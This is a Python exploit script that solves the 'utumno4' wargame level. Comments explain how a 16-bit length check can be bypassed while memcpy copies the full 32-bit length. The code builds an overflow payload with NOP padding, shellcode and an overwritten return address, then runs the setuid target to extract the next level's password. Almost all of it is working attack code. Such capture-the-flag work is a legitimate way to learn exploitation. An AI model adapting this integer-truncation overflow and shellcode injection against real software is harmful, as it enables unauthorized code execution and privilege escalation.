import ctypes, os, struct, sys, time

# ---------------------------------------------------------------------------
# utumno4's main(), after a huge stack-probe prologue (it reserves 0xf000
# bytes and touches each page -- a stack-clash guard):
#
#     int len = atoi(argv[1]);
#     unsigned short small = len;        /* only the LOW 16 BITS are kept */
#     if (small > 0x3f) exit(1);
#     memcpy(buf, argv[2], len);         /* buf is at ebp-0xff02 */
#
# The guard checks `(unsigned short)len <= 63`, so any len whose low 16 bits
# are 0..63 passes -- 65599 does.  But memcpy still copies the FULL 32-bit
# len, and the destination is 0xff02 bytes below ebp: the return address at
# ebp+4 is at offset 0xff06 = 65286 in the copy.  So a 65599-byte argv[2]
# overwrites the saved return address with bytes 65286..65289.
#
# ASLR is off and the stack is executable, so we put the shellcode at the
# start of the buffer (offset 8, after a few NOPs) and point the return
# address at it.  The address is fixed because argv/env layout is fixed;
# gdb measures it once (see the recording) and the exploit uses it directly.
# ---------------------------------------------------------------------------
libc = ctypes.CDLL("libc.so.6", use_errno=True)
libc.execve.argtypes = [ctypes.c_char_p,
                        ctypes.POINTER(ctypes.c_char_p),
                        ctypes.POINTER(ctypes.c_char_p)]

sc = open("/tmp/uu4/sc.bin", "rb").read()
print("shellcode: %d bytes, NUL: %s" % (len(sc), b"\x00" in sc), flush=True)

# measured in gdb with this exact argv layout (see the recording)
ADDR = 0xfffddede

LEN = 65536 + 63          # low 16 bits = 63 <= 0x3f, but the copy is 65599 long
RET_OFF = 0xff06          # buffer = ebp-0xff02, return address = ebp+4

def build(addr):
    a2 = bytearray(b"\x90" * (RET_OFF + 4))
    a2[8:8 + len(sc)] = sc
    a2[RET_OFF:RET_OFF + 4] = struct.pack("<I", addr)
    a2 += b"\x90" * (LEN - len(a2))     # memcpy reads LEN bytes from the source
    return bytes(a2)

def run(addr):
    argv = (ctypes.c_char_p * 4)(b"/utumno/utumno4", str(LEN).encode(),
                                 build(addr), None)
    env = (ctypes.c_char_p * 1)(None)
    r, w = os.pipe()
    pid = os.fork()
    if pid == 0:
        os.close(r)
        os.dup2(w, 1); os.dup2(w, 2); os.close(w)
        devnull = os.open("/dev/null", os.O_RDONLY); os.dup2(devnull, 0)
        libc.execve(b"/utumno/utumno4",
                    ctypes.cast(argv, ctypes.POINTER(ctypes.c_char_p)),
                    ctypes.cast(env, ctypes.POINTER(ctypes.c_char_p)))
        os._exit(1)
    os.close(w)
    # Read until EOF (the child exits after printing).  Stopping at the first
    # "PWN" would truncate the password that follows it in the same write.
    out = b""
    end = time.time() + 5.0
    while time.time() < end:
        try:
            chunk = os.read(r, 65536)
        except OSError:
            break
        if not chunk:
            break
        out += chunk
    os.close(r)
    os.waitpid(pid, 0)
    return out

print("using return address %#x (measured in gdb)" % ADDR, flush=True)
for attempt in range(3):
    out = run(ADDR)
    if b"PWN!" in out and len(out.split(b"PWN!")[1]) >= 11:
        print(out.split(b"PWN!")[1][:40].decode("latin-1"), flush=True)
        break
    print("attempt %d: incomplete output %r, retrying" % (attempt + 1, out[:20]), flush=True)
else:
    print("the address did not land on the shellcode")
    sys.exit(1)
